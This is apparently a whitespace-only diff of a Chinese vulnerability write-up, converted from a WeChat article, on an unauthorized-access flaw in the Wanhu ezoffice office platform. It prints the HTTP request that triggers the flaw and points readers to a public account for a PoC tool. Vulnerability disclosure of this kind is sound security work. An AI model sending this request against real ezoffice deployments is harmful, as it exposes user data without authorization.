@@ -3,7 +3,7 @@ fofa: "查询语句"
 source: "MrWQ/vulnerability-paper"
 ---
 
-# ​万户协同办公平台 ezoffice 存在未授权访问漏洞 附 POC
+# 万户协同办公平台 ezoffice 存在未授权访问漏洞 附 POC
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PjnbAiuNtQQx3XxhlpX8AA)
@@ -44,11 +44,11 @@ CNVD 编号:
 漏洞数据包：
 
 ```
-GET /defaultroot/evoInterfaceServlet?paramType=user HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept: */*
-Connection: Keep-Alive
+GET /defaultroot/evoInterfaceServlet?paramType=user HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept: */*
+Connection: Keep-Alive
 
 
 ```
@@ -58,7 +58,7 @@ Connection: Keep-Alive
 6.POC&EXP
 ---------
 
-关注公众号  南风漏洞复现文库 并回复  漏洞复现 45  即可获得该 POC 工具下载地址： 
+关注公众号  南风漏洞复现文库 并回复  漏洞复现 45  即可获得该 POC 工具下载地址： 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgaTz1LRndYnxls3CX2euzGcpQVAlhibgsDO2udZ0mZ71DTokswphDypvkgr6q3jewt4rBbIpnluA/640?wx_fmt=jpeg)
 
